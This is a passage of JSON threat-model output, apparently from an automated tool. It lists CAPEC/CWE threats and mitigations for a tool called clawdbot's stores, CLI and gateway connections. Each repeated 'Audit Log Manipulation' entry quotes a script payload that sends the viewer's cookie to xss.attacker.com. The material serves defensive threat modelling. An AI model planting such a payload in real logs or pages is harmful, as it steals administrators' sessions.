privilege to access resources that should be (but are not) reserved for higher privilege accounts. Likewise, the adversary does not exploit trust or subvert systems - all control functionality is working as configured but the configuration does not adequately protect sensitive resources at an appropriate level.", "example": "An adversary that has previously obtained unauthorized access to certain device resources, uses that access to obtain information such as location and network information.", "id": "269", "mitigations": "Use strong authentication and authorization mechanisms. A proven protocol is OAuth 2.0, which enables a third-party application to obtain limited access to an API.", "references": "https://capec.mitre.org/data/definitions/122.html, http://cwe.mitre.org/data/definitions/732.html, http://cwe.mitre.org/data/definitions/269.html", "response": "", "severity": "Medium", "target": "Session Store (sessions.json)", "threat_id": "AC01"}, {"assumption": null, "condition": "target.controls.handlesResourceConsumption is False", "cvss": "", "description": "Excessive Allocation", "details": "An adversary causes the target to allocate excessive resources to servicing the attackers' request, thereby reducing the resources available for legitimate services and degrading or denying services. Usually, this attack focuses on memory allocation, but any finite resource on the target could be the attacked, including bandwidth, processing cycles, or other resources. This attack does not attempt to force this allocation through a large number of requests (that would be Resource Depletion through Flooding) but instead uses one or a small number of requests that are carefully formatted to force the target to allocate excessive resources to service this request(s). Often this attack takes advantage of a bug in the target to cause the target to allocate resources vastly beyond what would be needed for a normal request.", "example": "In an Integer Attack, the adversary could cause a variable that controls allocation for a request to hold an excessively large value. Excessive allocation of resources can render a service degraded or unavailable to legitimate users and can even lead to crashing of the target.", "id": "270", "mitigations": "Limit the amount of resources that are accessible to unprivileged users. Assume all input is malicious. Consider all potentially relevant properties when validating input. Consider uniformly throttling all requests in order to make it more difficult to consume resources more quickly than they can again be freed. Use resource-limiting settings, if possible.", "references": "https://capec.mitre.org/data/definitions/130.html, http://cwe.mitre.org/data/definitions/770.html, http://cwe.mitre.org/data/definitions/404.html", "response": "", "severity": "Medium", "target": "Session Store (sessions.json)", "threat_id": "DO02"}, {"assumption": null, "condition": "target.controls.usesEncryptionAlgorithm != 'RSA' and target.controls.usesEncryptionAlgorithm != 'AES'", "cvss": "", "description": "Encryption Brute Forcing", "details": "An attacker, armed with the cipher text and the encryption algorithm used, performs an exhaustive (brute force) search on the key space to determine the key that decrypts the cipher text to obtain the plaintext.", "example": "In 1997 the original DES challenge used distributed net computing to brute force the encryption key and decrypt the ciphertext to obtain the original plaintext. Each machine was given its own section of the key space to cover. The ciphertext was decrypted in 96 days.", "id": "271", "mitigations": "Use commonly accepted algorithms and recommended key sizes. The key size used will depend on how important it is to keep the data confidential and for how long.In theory a brute force attack performing an exhaustive key space search will always succeed, so the goal is to have computational security. Moore's law needs to be taken into account that suggests that computing resources double every eighteen months.", "references": "https://capec.mitre.org/data/definitions/20.html, http://cwe.mitre.org/data/definitions/326.html, http://cwe.mitre.org/data/definitions/327.html, http://cwe.mitre.org/data/definitions/693.html, http://cwe.mitre.org/data/definitions/719.html", "response": "", "severity": "Low", "target": "Session Store (sessions.json)", "threat_id": "CR05"}, {"assumption": null, "condition": "target.controls.validatesInput is False or target.controls.implementsPOLP is False", "cvss": "", "description": "Audit Log Manipulation", "details": "The attacker injects, manipulates, deletes, or forges malicious log entries into the log file, in an attempt to mislead an audit of the log file or cover tracks of an attack. Due to either insufficient access controls of the log files or the logging mechanism, the attacker is able to perform such actions.", "example": "The attacker alters the log contents either directly through manipulation or forging or indirectly through injection of specially crafted input that the target software will write to the logs. This type of attack typically follows another attack and is used to try to cover the traces of the previous attack. Insert a script into the log file such that if it is viewed using a web browser, the attacker will get a copy of the operator/administrator's cookie and will be able to gain access as that user. For example, a log file entry could contain <script>new Image().src='http://xss.attacker.com/log_cookie?cookie='+encodeURI(document.cookie);</script> The script itself will be invisible to anybody viewing the logs in a web browser (unless they view the source for the page).", "id": "272", "mitigations": "Use Principle of Least Privilege to avoid unauthorized access to log files leading to manipulation/injection on those files. Do not allow tainted data to be written in the log file without prior input validation. Whitelisting may be used to properly validate the data. Use synchronization to control the flow of execution. Use static analysis tool to identify log forging vulnerabilities. Avoid viewing logs with tools that may interpret control characters in the file, such as command-line shells.", "references": "https://capec.mitre.org/data/definitions/268.html, https://capec.mitre.org/data/definitions/93.html", "response": "", "severity": "High", "target": "Session Store (sessions.json)", "threat_id": "DE04"}, {"assumption": null, "condition": "target.controls.hasAccessControl is False or target.controls.authorizesSource is False", "cvss": "", "description": "Privilege Abuse", "details": "An adversary is able to exploit features of the target that should be reserved for privileged users or administrators but are exposed to use by lower or non-privileged accounts. Access to sensitive information and functionality must be controlled to ensure that only authorized users are able to access these resources. If access control mechanisms are absent or misconfigured, a user may be able to access resources that are intended only for higher level users. An adversary may be able to exploit this to utilize a less trusted account to gain information and perform activities reserved for more trusted accounts. This attack differs from privilege escalation and other privilege stealing attacks in that the adversary never actually escalates their privileges but instead is able to use a lesser degree of privilege to access resources that should be (but are not) reserved for higher privilege accounts. Likewise, the adversary does not exploit trust or subvert systems - all control functionality is working as configured but the configuration does not adequately protect sensitive resources at an appropriate level.", "example": "An adversary that has previously obtained unauthorized access to certain device resources, uses that access to obtain information such as location and network information.", "id": "273", "mitigations": "Use strong authentication and authorization mechanisms. A proven protocol is OAuth 2.0, which enables a third-party application to obtain limited access to an API.", "references": "https://capec.mitre.org/data/definitions/122.html, http://cwe.mitre.org/data/definitions/732.html, http://cwe.mitre.org/data/definitions/269.html", "response": "", "severity": "Medium", "target": "Transcript Store (*.jsonl)", "threat_id": "AC01"}, {"assumption": null, "condition": "target.controls.handlesResourceConsumption is False", "cvss": "", "description": "Excessive Allocation", "details": "An adversary causes the target to allocate excessive resources to servicing the attackers' request, thereby reducing the resources available for legitimate services and degrading or denying services. Usually, this attack focuses on memory allocation, but any finite resource on the target could be the attacked, including bandwidth, processing cycles, or other resources. This attack does not attempt to force this allocation through a large number of requests (that would be Resource Depletion through Flooding) but instead uses one or a small number of requests that are carefully formatted to force the target to allocate excessive resources to service this request(s). Often this attack takes advantage of a bug in the target to cause the target to allocate resources vastly beyond what would be needed for a normal request.", "example": "In an Integer Attack, the adversary could cause a variable that controls allocation for a request to hold an excessively large value. Excessive allocation of resources can render a service degraded or unavailable to legitimate users and can even lead to crashing of the target.", "id": "274", "mitigations": "Limit the amount of resources that are accessible to unprivileged users. Assume all input is malicious. Consider all potentially relevant properties when validating input. Consider uniformly throttling all requests in order to make it more difficult to consume resources more quickly than they can again be freed. Use resource-limiting settings, if possible.", "references": "https://capec.mitre.org/data/definitions/130.html, http://cwe.mitre.org/data/definitions/770.html, http://cwe.mitre.org/data/definitions/404.html", "response": "", "severity": "Medium", "target": "Transcript Store (*.jsonl)", "threat_id": "DO02"}, {"assumption": null, "condition": "target.controls.usesEncryptionAlgorithm != 'RSA' and target.controls.usesEncryptionAlgorithm != 'AES'", "cvss": "", "description": "Encryption Brute Forcing", "details": "An attacker, armed with the cipher text and the encryption algorithm used, performs an exhaustive (brute force) search on the key space to determine the key that decrypts the cipher text to obtain the plaintext.", "example": "In 1997 the original DES challenge used distributed net computing to brute force the encryption key and decrypt the ciphertext to obtain the original plaintext. Each machine was given its own section of the key space to cover. The ciphertext was decrypted in 96 days.", "id": "275", "mitigations": "Use commonly accepted algorithms and recommended key sizes. The key size used will depend on how important it is to keep the data confidential and for how long.In theory a brute force attack performing an exhaustive key space search will always succeed, so the goal is to have computational security. Moore's law needs to be taken into account that suggests that computing resources double every eighteen months.", "references": "https://capec.mitre.org/data/definitions/20.html, http://cwe.mitre.org/data/definitions/326.html, http://cwe.mitre.org/data/definitions/327.html, http://cwe.mitre.org/data/definitions/693.html, http://cwe.mitre.org/data/definitions/719.html", "response": "", "severity": "Low", "target": "Transcript Store (*.jsonl)", "threat_id": "CR05"}, {"assumption": null, "condition": "target.controls.validatesInput is False or target.controls.implementsPOLP is False", "cvss": "", "description": "Audit Log Manipulation", "details": "The attacker injects, manipulates, deletes, or forges malicious log entries into the log file, in an attempt to mislead an audit of the log file or cover tracks of an attack. Due to either insufficient access controls of the log files or the logging mechanism, the attacker is able to perform such actions.", "example": "The attacker alters the log contents either directly through manipulation or forging or indirectly through injection of specially crafted input that the target software will write to the logs. This type of attack typically follows another attack and is used to try to cover the traces of the previous attack. Insert a script into the log file such that if it is viewed using a web browser, the attacker will get a copy of the operator/administrator's cookie and will be able to gain access as that user. For example, a log file entry could contain <script>new Image().src='http://xss.attacker.com/log_cookie?cookie='+encodeURI(document.cookie);</script> The script itself will be invisible to anybody viewing the logs in a web browser (unless they view the source for the page).", "id": "276", "mitigations": "Use Principle of Least Privilege to avoid unauthorized access to log files leading to manipulation/injection on those files. Do not allow tainted data to be written in the log file without prior input validation. Whitelisting may be used to properly validate the data. Use synchronization to control the flow of execution. Use static analysis tool to identify log forging vulnerabilities. Avoid viewing logs with tools that may interpret control characters in the file, such as command-line shells.", "references": "https://capec.mitre.org/data/definitions/268.html, https://capec.mitre.org/data/definitions/93.html", "response": "", "severity": "High", "target": "Transcript Store (*.jsonl)", "threat_id": "DE04"}, {"assumption": null, "condition": "target.controls.hasAccessControl is False or target.controls.authorizesSource is False", "cvss": "", "description": "Privilege Abuse", "details": "An adversary is able to exploit features of the target that should be reserved for privileged users or administrators but are exposed to use by lower or non-privileged accounts. Access to sensitive information and functionality must be controlled to ensure that only authorized users are able to access these resources. If access control mechanisms are absent or misconfigured, a user may be able to access resources that are intended only for higher level users. An adversary may be able to exploit this to utilize a less trusted account to gain information and perform activities reserved for more trusted accounts. This attack differs from privilege escalation and other privilege stealing attacks in that the adversary never actually escalates their privileges but instead is able to use a lesser degree of privilege to access resources that should be (but are not) reserved for higher privilege accounts. Likewise, the adversary does not exploit trust or subvert systems - all control functionality is working as configured but the configuration does not adequately protect sensitive resources at an appropriate level.", "example": "An adversary that has previously obtained unauthorized access to certain device resources, uses that access to obtain information such as location and network information.", "id": "277", "mitigations": "Use strong authentication and authorization mechanisms. A proven protocol is OAuth 2.0, which enables a third-party application to obtain limited access to an API.", "references": "https://capec.mitre.org/data/definitions/122.html, http://cwe.mitre.org/data/definitions/732.html, http://cwe.mitre.org/data/definitions/269.html", "response": "", "severity": "Medium", "target": "Log Store (~/.clawdbot/logs)", "threat_id": "AC01"}, {"assumption": null, "condition": "target.controls.handlesResourceConsumption is False", "cvss": "", "description": "Excessive Allocation", "details": "An adversary causes the target to allocate excessive resources to servicing the attackers' request, thereby reducing the resources available for legitimate services and degrading or denying services. Usually, this attack focuses on memory allocation, but any finite resource on the target could be the attacked, including bandwidth, processing cycles, or other resources. This attack does not attempt to force this allocation through a large number of requests (that would be Resource Depletion through Flooding) but instead uses one or a small number of requests that are carefully formatted to force the target to allocate excessive resources to service this request(s). Often this attack takes advantage of a bug in the target to cause the target to allocate resources vastly beyond what would be needed for a normal request.", "example": "In an Integer Attack, the adversary could cause a variable that controls allocation for a request to hold an excessively large value. Excessive allocation of resources can render a service degraded or unavailable to legitimate users and can even lead to crashing of the target.", "id": "278", "mitigations": "Limit the amount of resources that are accessible to unprivileged users. Assume all input is malicious. Consider all potentially relevant properties when validating input. Consider uniformly throttling all requests in order to make it more difficult to consume resources more quickly than they can again be freed. Use resource-limiting settings, if possible.", "references": "https://capec.mitre.org/data/definitions/130.html, http://cwe.mitre.org/data/definitions/770.html, http://cwe.mitre.org/data/definitions/404.html", "response": "", "severity": "Medium", "target": "Log Store (~/.clawdbot/logs)", "threat_id": "DO02"}, {"assumption": null, "condition": "target.controls.usesEncryptionAlgorithm != 'RSA' and target.controls.usesEncryptionAlgorithm != 'AES'", "cvss": "", "description": "Encryption Brute Forcing", "details": "An attacker, armed with the cipher text and the encryption algorithm used, performs an exhaustive (brute force) search on the key space to determine the key that decrypts the cipher text to obtain the plaintext.", "example": "In 1997 the original DES challenge used distributed net computing to brute force the encryption key and decrypt the ciphertext to obtain the original plaintext. Each machine was given its own section of the key space to cover. The ciphertext was decrypted in 96 days.", "id": "279", "mitigations": "Use commonly accepted algorithms and recommended key sizes. The key size used will depend on how important it is to keep the data confidential and for how long.In theory a brute force attack performing an exhaustive key space search will always succeed, so the goal is to have computational security. Moore's law needs to be taken into account that suggests that computing resources double every eighteen months.", "references": "https://capec.mitre.org/data/definitions/20.html, http://cwe.mitre.org/data/definitions/326.html, http://cwe.mitre.org/data/definitions/327.html, http://cwe.mitre.org/data/definitions/693.html, http://cwe.mitre.org/data/definitions/719.html", "response": "", "severity": "Low", "target": "Log Store (~/.clawdbot/logs)", "threat_id": "CR05"}, {"assumption": null, "condition": "target.controls.validatesInput is False or target.controls.implementsPOLP is False", "cvss": "", "description": "Audit Log Manipulation", "details": "The attacker injects, manipulates, deletes, or forges malicious log entries into the log file, in an attempt to mislead an audit of the log file or cover tracks of an attack. Due to either insufficient access controls of the log files or the logging mechanism, the attacker is able to perform such actions.", "example": "The attacker alters the log contents either directly through manipulation or forging or indirectly through injection of specially crafted input that the target software will write to the logs. This type of attack typically follows another attack and is used to try to cover the traces of the previous attack. Insert a script into the log file such that if it is viewed using a web browser, the attacker will get a copy of the operator/administrator's cookie and will be able to gain access as that user. For example, a log file entry could contain <script>new Image().src='http://xss.attacker.com/log_cookie?cookie='+encodeURI(document.cookie);</script> The script itself will be invisible to anybody viewing the logs in a web browser (unless they view the source for the page).", "id": "280", "mitigations": "Use Principle of Least Privilege to avoid unauthorized access to log files leading to manipulation/injection on those files. Do not allow tainted data to be written in the log file without prior input validation. Whitelisting may be used to properly validate the data. Use synchronization to control the flow of execution. Use static analysis tool to identify log forging vulnerabilities. Avoid viewing logs with tools that may interpret control characters in the file, such as command-line shells.", "references": "https://capec.mitre.org/data/definitions/268.html, https://capec.mitre.org/data/definitions/93.html", "response": "", "severity": "High", "target": "Log Store (~/.clawdbot/logs)", "threat_id": "DE04"}, {"assumption": null, "condition": "target.controls.hasAccessControl is False or target.controls.authorizesSource is False", "cvss": "", "description": "Privilege Abuse", "details": "An adversary is able to exploit features of the target that should be reserved for privileged users or administrators but are exposed to use by lower or non-privileged accounts. Access to sensitive information and functionality must be controlled to ensure that only authorized users are able to access these resources. If access control mechanisms are absent or misconfigured, a user may be able to access resources that are intended only for higher level users. An adversary may be able to exploit this to utilize a less trusted account to gain information and perform activities reserved for more trusted accounts. This attack differs from privilege escalation and other privilege stealing attacks in that the adversary never actually escalates their privileges but instead is able to use a lesser degree of privilege to access resources that should be (but are not) reserved for higher privilege accounts. Likewise, the adversary does not exploit trust or subvert systems - all control functionality is working as configured but the configuration does not adequately protect sensitive resources at an appropriate level.", "example": "An adversary that has previously obtained unauthorized access to certain device resources, uses that access to obtain information such as location and network information.", "id": "281", "mitigations": "Use strong authentication and authorization mechanisms. A proven protocol is OAuth 2.0, which enables a third-party application to obtain limited access to an API.", "references": "https://capec.mitre.org/data/definitions/122.html, http://cwe.mitre.org/data/definitions/732.html, http://cwe.mitre.org/data/definitions/269.html", "response": "", "severity": "Medium", "target": "Plugin Store (~/.clawdbot/extensions)", "threat_id": "AC01"}, {"assumption": null, "condition": "target.controls.handlesResourceConsumption is False", "cvss": "", "description": "Excessive Allocation", "details": "An adversary causes the target to allocate excessive resources to servicing the attackers' request, thereby reducing the resources available for legitimate services and degrading or denying services. Usually, this attack focuses on memory allocation, but any finite resource on the target could be the attacked, including bandwidth, processing cycles, or other resources. This attack does not attempt to force this allocation through a large number of requests (that would be Resource Depletion through Flooding) but instead uses one or a small number of requests that are carefully formatted to force the target to allocate excessive resources to service this request(s). Often this attack takes advantage of a bug in the target to cause the target to allocate resources vastly beyond what would be needed for a normal request.", "example": "In an Integer Attack, the adversary could cause a variable that controls allocation for a request to hold an excessively large value. Excessive allocation of resources can render a service degraded or unavailable to legitimate users and can even lead to crashing of the target.", "id": "282", "mitigations": "Limit the amount of resources that are accessible to unprivileged users. Assume all input is malicious. Consider all potentially relevant properties when validating input. Consider uniformly throttling all requests in order to make it more difficult to consume resources more quickly than they can again be freed. Use resource-limiting settings, if possible.", "references": "https://capec.mitre.org/data/definitions/130.html, http://cwe.mitre.org/data/definitions/770.html, http://cwe.mitre.org/data/definitions/404.html", "response": "", "severity": "Medium", "target": "Plugin Store (~/.clawdbot/extensions)", "threat_id": "DO02"}, {"assumption": null, "condition": "target.controls.usesEncryptionAlgorithm != 'RSA' and target.controls.usesEncryptionAlgorithm != 'AES'", "cvss": "", "description": "Encryption Brute Forcing", "details": "An attacker, armed with the cipher text and the encryption algorithm used, performs an exhaustive (brute force) search on the key space to determine the key that decrypts the cipher text to obtain the plaintext.", "example": "In 1997 the original DES challenge used distributed net computing to brute force the encryption key and decrypt the ciphertext to obtain the original plaintext. Each machine was given its own section of the key space to cover. The ciphertext was decrypted in 96 days.", "id": "283", "mitigations": "Use commonly accepted algorithms and recommended key sizes. The key size used will depend on how important it is to keep the data confidential and for how long.In theory a brute force attack performing an exhaustive key space search will always succeed, so the goal is to have computational security. Moore's law needs to be taken into account that suggests that computing resources double every eighteen months.", "references": "https://capec.mitre.org/data/definitions/20.html, http://cwe.mitre.org/data/definitions/326.html, http://cwe.mitre.org/data/definitions/327.html, http://cwe.mitre.org/data/definitions/693.html, http://cwe.mitre.org/data/definitions/719.html", "response": "", "severity": "Low", "target": "Plugin Store (~/.clawdbot/extensions)", "threat_id": "CR05"}, {"assumption": null, "condition": "target.controls.validatesInput is False or target.controls.implementsPOLP is False", "cvss": "", "description": "Audit Log Manipulation", "details": "The attacker injects, manipulates, deletes, or forges malicious log entries into the log file, in an attempt to mislead an audit of the log file or cover tracks of an attack. Due to either insufficient access controls of the log files or the logging mechanism, the attacker is able to perform such actions.", "example": "The attacker alters the log contents either directly through manipulation or forging or indirectly through injection of specially crafted input that the target software will write to the logs. This type of attack typically follows another attack and is used to try to cover the traces of the previous attack. Insert a script into the log file such that if it is viewed using a web browser, the attacker will get a copy of the operator/administrator's cookie and will be able to gain access as that user. For example, a log file entry could contain <script>new Image().src='http://xss.attacker.com/log_cookie?cookie='+encodeURI(document.cookie);</script> The script itself will be invisible to anybody viewing the logs in a web browser (unless they view the source for the page).", "id": "284", "mitigations": "Use Principle of Least Privilege to avoid unauthorized access to log files leading to manipulation/injection on those files. Do not allow tainted data to be written in the log file without prior input validation. Whitelisting may be used to properly validate the data. Use synchronization to control the flow of execution. Use static analysis tool to identify log forging vulnerabilities. Avoid viewing logs with tools that may interpret control characters in the file, such as command-line shells.", "references": "https://capec.mitre.org/data/definitions/268.html, https://capec.mitre.org/data/definitions/93.html", "response": "", "severity": "High", "target": "Plugin Store (~/.clawdbot/extensions)", "threat_id": "DE04"}, {"assumption": null, "condition": "not target.controls.isEncrypted or (target.source.inScope and not target.isResponse and (not target.controls.authenticatesDestination or not target.controls.checksDestinationRevocation)) or target.tlsVersion < target.sink.minTLSVersion", "cvss": "", "description": "Interception", "details": "An adversary monitors data streams to or from the target for information gathering purposes. This attack may be undertaken to solely gather sensitive information or to support a further attack against the target. This attack pattern can involve sniffing network traffic as well as other types of data streams (e.g. radio). The adversary can attempt to initiate the establishment of a data stream, influence the nature of the data transmitted, or passively observe the communications as they unfold. In all variants of this attack, the adversary is not the intended recipient of the data stream. In contrast to other means of gathering information (e.g., targeting data leaks), the adversary must actively position himself so as to observe explicit data channels (e.g. network traffic) and read the content.", "example": "Adversary tries to block, manipulate, and steal communications in an attempt to achieve a desired negative technical impact.", "id": "285", "mitigations": "Leverage encryption to encode the transmission of data thus making it accessible only to authorized parties.", "references": "https://capec.mitre.org/data/definitions/117.html, http://cwe.mitre.org/data/definitions/319.html, https://cwe.mitre.org/data/definitions/299.html", "response": "", "severity": "Medium", "target": "Operator runs CLI commands", "threat_id": "DE01"}, {"assumption": null, "condition": "((not target.source.controls.providesIntegrity or not target.sink.controls.providesIntegrity) and not target.controls.isEncrypted) or (target.source.inScope and not target.isResponse and (not target.controls.authenticatesDestination or not target.controls.checksDestinationRevocation))", "cvss": "", "description": "Content Spoofing", "details": "An adversary modifies content to make it contain something other than what the original content producer intended while keeping the apparent source of the content unchanged. The term content spoofing is most often used to describe modification of web pages hosted by a target to display the adversary's content instead of the owner's content. However, any content can be spoofed, including the content of email messages, file transfers, or the content of other network communication protocols. Content can be modified at the source (e.g. modifying the source file for a web page) or in transit (e.g. intercepting and modifying a message between the sender and recipient). Usually, the adversary will attempt to hide the fact that the content has been modified, but in some cases, such as with web site defacement, this is not necessary. Content Spoofing can lead to malware exposure, financial fraud (if the content governs financial transactions), privacy violations, and other unwanted outcomes.", "example": "An attacker finds a site which is vulnerable to HTML Injection. He sends a URL with malicious code injected in the URL to the user of the website(victim) via email or some other social networking site. User visits the page because the page is located within trusted domain. When the victim accesses the page, the injected HTML code is rendered and presented to the user asking for username and password. The username and password are both sent to the attacker's server.", "id": "286", "mitigations": "Validation of user input for type, length, data-range, format, etc. Encoding any user input that will be output by the web application.", "references": "https://capec.mitre.org/data/definitions/148.html, http://cwe.mitre.org/data/definitions/345.html, https://cwe.mitre.org/data/definitions/299.html", "response": "", "severity": "Medium", "target": "Operator runs CLI commands", "threat_id": "AC05"}, {"assumption": null, "condition": "(target.protocol == 'HTTP' or target.controls.isEncrypted is False) or target.usesVPN is False", "cvss": "", "description": "Sniffing Attacks", "details": "In this attack pattern, the adversary intercepts information transmitted between two third parties. The adversary must be able to observe, read, and/or hear the communication traffic, but not necessarily block the communication or change its content. The adversary may precipitate or indirectly influence the content of the observed transaction, but is never the intended recipient of the information. Any transmission medium can theoretically be sniffed if the adversary can examine the contents between the sender and recipient.", "example": "Attacker knows that the computer/OS/application can request new applications to install, or it periodically checks for an available update. The attacker loads the sniffer set up during Explore phase, and extracts the application code from subsequent communication. The attacker then proceeds to reverse engineer the captured code.", "id": "287", "mitigations": "Encrypt sensitive information when transmitted on insecure mediums to prevent interception.", "references": "https://capec.mitre.org/data/definitions/157.html, http://cwe.mitre.org/data/definitions/311.html", "response": "", "severity": "Medium", "target": "Operator runs CLI commands", "threat_id": "DE03"}, {"assumption": null, "condition": "(target.protocol != 'HTTPS' or target.usesVPN is False) and (target.controls.implementsAuthenticationScheme is False or target.controls.authorizesSource is False)", "cvss": "", "description": "Communication Channel Manipulation", "details": "An adversary manipulates a setting or parameter on communications channel in order to compromise its security. This can result in information exposure, insertion/removal of information from the communications stream, and/or potentially system compromise.", "example": "Using MITM techniques, an attacker launches a blockwise chosen-boundary attack to obtain plaintext HTTP headers by taking advantage of an SSL session using an encryption protocol in CBC mode with chained initialization vectors (IV). This allows the attacker to recover session IDs, authentication cookies, and possibly other valuable data that can be used for further exploitation. Additionally this could allow for the insertion of data into the stream, allowing for additional attacks (CSRF, SQL inject, etc) to occur.", "id": "288", "mitigations": "Encrypt all sensitive communications using properly-configured cryptography.Design the communication system such that it associates proper authentication/authorization with each channel/message.", "references": "https://capec.mitre.org/data/definitions/216.html", "response": "", "severity": "High", "target": "Operator runs CLI commands", "threat_id": "CR06"}, {"assumption": null, "condition": "not target.controls.isEncrypted or target.tlsVersion < target.sink.minTLSVersion", "cvss": "", "description": "Client-Server Protocol Manipulation", "details": "An adversary takes advantage of weaknesses in the protocol by which a client and server are communicating to perform unexpected actions. Communication protocols are necessary to transfer messages between client and server applications. Moreover, different protocols may be used for different types of interactions. For example, an authentication protocol might be used to establish the identities of the server and client while a separate messaging protocol might be used to exchange data. If there is a weakness in a protocol used by the client and server, an attacker might take advantage of this to perform various types of attacks. For example, if the attacker is able to manipulate an authentication protocol, the attacker may be able spoof other clients or servers. If the attacker is able to manipulate a messaging protocol, the may be able to read sensitive information or modify message contents. This attack is often made easier by the fact that many clients and servers support multiple protocols to perform similar roles. For example, a server might support several different authentication protocols in order to support a wide range of clients, including legacy clients. Some of the older protocols may have vulnerabilities that allow an attacker to manipulate client-server interactions.", "example": "An adversary could exploit existing communication protocol vulnerabilities and can launch MITM attacks and gain sensitive information or spoof client/server identities.", "id": "289", "mitigations": "Use strong authentication protocols.", "references": "https://capec.mitre.org/data/definitions/220.html, http://cwe.mitre.org/data/definitions/757.html", "response": "", "severity": "Medium", "target": "Operator runs CLI commands", "threat_id": "CR08"}, {"assumption": null, "condition": "target.hasDataLeaks()", "cvss": "", "description": "Data Leak", "details": "An attacker can access data in transit or at rest that is not sufficiently protected. If an attacker can decrypt a stored password, it might be used to authenticate against different services.", "example": "An application, which connects to a database without TLS, performs a database query in which it compares the password to a stored hash, instead of fetching the hash and comparing it locally.", "id": "290", "mitigations": "All data should be encrypted in transit. All PII and restricted data must be encrypted at rest. If a service is storing credentials used to authenticate users or incoming connections, it must only store hashes of them created using cryptographic functions, so it is only possible to compare them against user input, without fully decoding them. If a client is storing credentials in either files or other data store, access to them must be as restrictive as possible, including using proper file permissions, database users with restricted access or separate storage.", "references": "https://cwe.mitre.org/data/definitions/311.html, https://cwe.mitre.org/data/definitions/312.html, https://cwe.mitre.org/data/definitions/916.html, https://cwe.mitre.org/data/definitions/653.html", "response": "", "severity": "Very High", "target": "Operator runs CLI commands", "threat_id": "DS06"}, {"assumption": null, "condition": "(target.hasDataLeaks() or any(d.isCredentials or d.isPII for d in target.data)) and (not target.controls.isEncrypted or (not target.isResponse and any(d.isStored and d.isDestEncryptedAtRest for d in target.data)) or (target.isResponse and any(d.isStored and d.isSourceEncryptedAtRest for d in target.data)))", "cvss": "", "description": "Unprotected Sensitive Data", "details": "An attacker can access data in transit or at rest that is not sufficiently protected. If an attacker can decrypt a stored password, it might be used to authenticate against different services.", "example": "", "id": "291", "mitigations": "All data should be encrypted in transit. All PII and restricted data must be encrypted at rest. If a service is storing credentials used to authenticate users or incoming connections, it must only store hashes of them created using cryptographic functions, so it is only possible to compare them against user input, without fully decoding them. If a client is storing credentials in either files or other data store, access to them must be as restrictive as possible, including using proper file permissions, database users with restricted access or separate storage.", "references": "https://cwe.mitre.org/data/definitions/311.html, https://cwe.mitre.org/data/definitions/312.html, https://cwe.mitre.org/data/definitions/916.html, https://cwe.mitre.org/data/definitions/653.html", "response": "", "severity": "High", "target": "Operator runs CLI commands", "threat_id": "DR01"}, {"assumption": null, "condition": "not target.controls.isEncrypted or (target.source.inScope and not target.isResponse and (not target.controls.authenticatesDestination or not target.controls.checksDestinationRevocation)) or target.tlsVersion < target.sink.minTLSVersion", "cvss": "", "description": "Interception", "details": "An adversary monitors data streams to or from the target for information gathering purposes. This attack may be undertaken to solely gather sensitive information or to support a further attack against the target. This attack pattern can involve sniffing network traffic as well as other types of data streams (e.g. radio). The adversary can attempt to initiate the establishment of a data stream, influence the nature of the data transmitted, or passively observe the communications as they unfold. In all variants of this attack, the adversary is not the intended recipient of the data stream. In contrast to other means of gathering information (e.g., targeting data leaks), the adversary must actively position himself so as to observe explicit data channels (e.g. network traffic) and read the content.", "example": "Adversary tries to block, manipulate, and steal communications in an attempt to achieve a desired negative technical impact.", "id": "292", "mitigations": "Leverage encryption to encode the transmission of data thus making it accessible only to authorized parties.", "references": "https://capec.mitre.org/data/definitions/117.html, http://cwe.mitre.org/data/definitions/319.html, https://cwe.mitre.org/data/definitions/299.html", "response": "", "severity": "Medium", "target": "CLI connects to Gateway WS/HTTP", "threat_id": "DE01"}, {"assumption": null, "condition": "((not target.source.controls.providesIntegrity or not target.sink.controls.providesIntegrity) and not target.controls.isEncrypted) or (target.source.inScope and not target.isResponse and (not target.controls.authenticatesDestination or not target.controls.checksDestinationRevocation))", "cvss": "", "description": "Content Spoofing", "details": "An adversary modifies content to make it contain something other than what the original content producer intended while keeping the apparent source of the content unchanged. The term content spoofing is most often used to describe modification of web pages hosted by a target to display the adversary's content instead of the owner's content. However, any content can be spoofed, including the content of email messages, file transfers, or the content of other network communication protocols. Content can be modified at the source (e.g. modifying the source file for a web page) or in transit (e.g. intercepting and modifying a message between the sender and recipient). Usually, the adversary will attempt to hide the fact that the content has been modified, but in some cases, such as with web site defacement, this is not necessary. Content Spoofing can lead to malware exposure, financial fraud (if the content governs financial transactions), privacy violations, and other unwanted outcomes.", "example": "An attacker finds a site which is vulnerable to HTML Injection. He sends a URL with malicious code injected in the URL to the user of the website(victim) via email or some other social networking site. User visits the page because the page is located within trusted domain. When the victim accesses the page, the injected HTML code is rendered and presented to the user asking for username and password. The username and password are both sent to the attacker's server.", "id": "293", "mitigations": "Validation of user input for type, length, data-range, format, etc. Encoding any user input that will be output by the web application.", "references": "https://capec.mitre.org/data/definitions/148.html, http://cwe.mitre.org/data/definitions/345.html, https://cwe.mitre.org/data/definitions/299.html", "response": "", "severity": "Medium", "target": "CLI connects to Gateway WS/HTTP", "threat_id": "AC05"}, {"assumption": null, "condition": "(target.protocol == 'HTTP' or target.controls.isEncrypted is False) or target.usesVPN is False", "cvss": "", "description": "Sniffing Attacks", "details": "In this attack pattern, the adversary intercepts information transmitted between two third parties. The adversary must be able to observe, read, and/or hear the communication traffic, but not necessarily block the communication or change its content. The adversary may precipitate or indirectly influence the content of the observed transaction, but is never the intended recipient of the information. Any transmission medium can theoretically be sniffed if the adversary can examine the contents between the sender and recipient.", "example": "Attacker knows that the computer/OS/application can request new applications to install, or it periodically checks for an available update. The attacker loads the sniffer set up during Explore phase, and extracts the application code from subsequent communication. The attacker then proceeds to reverse engineer the captured code.", "id": "294", "mitigations": "Encrypt sensitive information when transmitted on insecure mediums to prevent interception.", "references": "https://capec.mitre.org/data/definitions/157.html, http://cwe.mitre.org/data/definitions/311.html", "response": "", "severity": "Medium", "target": "CLI connects to Gateway WS/HTTP", "threat_id": "DE03"}, {"assumption": null, "condition": "(target.protocol != 'HTTPS' or target.usesVPN is False) and (target.controls.implementsAuthenticationScheme is False or target.controls.authorizesSource is False)", "cvss": "", "description": "Communication Channel Manipulation", "details": "An adversary manipulates a setting or parameter on communications channel in order to compromise its security. This can result in information exposure, insertion/removal of information from the communications stream, and/or potentially system compromise.", "example": "Using MITM techniques, an attacker launches a blockwise chosen-boundary attack to obtain plaintext HTTP headers by taking advantage of an SSL session using an encryption protocol in CBC mode with chained initialization vectors (IV). This allows the attacker to recover session IDs, authentication cookies, and possibly other valuable data that can be used for further exploitation. Additionally this could 